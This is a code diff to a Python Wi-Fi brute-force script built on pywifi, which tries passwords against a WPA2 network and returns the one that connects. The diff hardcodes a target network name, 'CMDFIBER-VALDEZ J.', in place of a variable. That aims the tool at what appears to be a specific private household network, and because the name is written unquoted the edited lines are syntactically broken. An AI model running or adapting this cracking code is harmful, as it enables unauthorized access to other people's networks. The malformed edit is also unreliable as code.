@@ -121,7 +121,7 @@ def test(i ,face,x,key,ts):
         print(f"{ran}Trying password {r}{str(password)} {c}{str(n)} / {g}{str(len(key))}")
 
         profile = pywifi.Profile()
-        profile.ssid = wifi_name
+        profile.ssid = CMDFIBER-VALDEZ J.
         profile.auth = const.AUTH_ALG_OPEN
         profile.akm.append(const.AKM_TYPE_WPA2PSK)
         profile.cipher = const.CIPHER_TYPE_CCMP
@@ -141,7 +141,7 @@ def test(i ,face,x,key,ts):
                 break
             if code == 4:
                 face.disconnect()
-                return str(wifi_name) + "--" + str(password)
+                return str(CMDFIBER-VALDEZ J.) + "--" + str(password)
     return False
 
 cont = ""
